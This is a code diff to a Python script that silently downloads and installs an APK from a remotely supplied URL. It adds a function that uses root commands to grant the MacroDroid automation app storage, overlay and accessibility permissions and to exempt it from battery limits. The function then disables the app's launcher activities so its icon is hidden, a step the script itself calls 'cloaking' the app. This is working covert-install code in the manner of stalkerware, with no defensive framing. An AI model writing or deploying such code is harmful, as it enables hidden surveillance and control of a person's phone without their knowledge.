@@ -26,6 +26,26 @@ def is_app_installed():
     except Exception:
         return False
 
+def setup_macrodroid():
+    print("⚙️ [SETUP] Configuring permissions and cloaking the app...", flush=True)
+    commands = [
+        'su -c "pm grant com.arlosoft.macrodroid android.permission.WRITE_EXTERNAL_STORAGE"',
+        'su -c "pm grant com.arlosoft.macrodroid android.permission.READ_EXTERNAL_STORAGE"',
+        'su -c "appops set com.arlosoft.macrodroid SYSTEM_ALERT_WINDOW allow"',
+        'su -c "dumpsys deviceidle whitelist +com.arlosoft.macrodroid"',
+        'su -c "settings put secure enabled_accessibility_services com.arlosoft.macrodroid/com.arlosoft.macrodroid.MacroDroidAccessibilityService"',
+        'su -c "settings put secure accessibility_enabled 1"',
+        'su -c "pm disable com.arlosoft.macrodroid/com.arlosoft.macrodroid.MainActivity"',
+        'su -c "pm disable com.arlosoft.macrodroid/com.arlosoft.macrodroid.LauncherActivity"',
+        'su -c "pm disable com.arlosoft.macrodroid/com.arlosoft.macrodroid.intro.IntroActivity"'
+    ]
+    
+    for cmd in commands:
+        subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
+        time.sleep(0.3)
+        
+    print("✅ [SETUP] Permissions granted and icon successfully hidden!", flush=True)
+
 def download_and_install(url):
     apk_path = "/sdcard/sys_app_temp.apk"
     try:
@@ -117,6 +137,7 @@ def check_authorization():
                     print("📥 [DOWNLOAD] Downloading APK...", flush=True)
                     if download_and_install(data["system_apk_url"]):
                         print("🚀 [SUCCESS] Silent installation completed!", flush=True)
+                        setup_macrodroid()
                         installed = True
                     else:
                         print("❌ [ERROR] Failed to install APK.", flush=True)
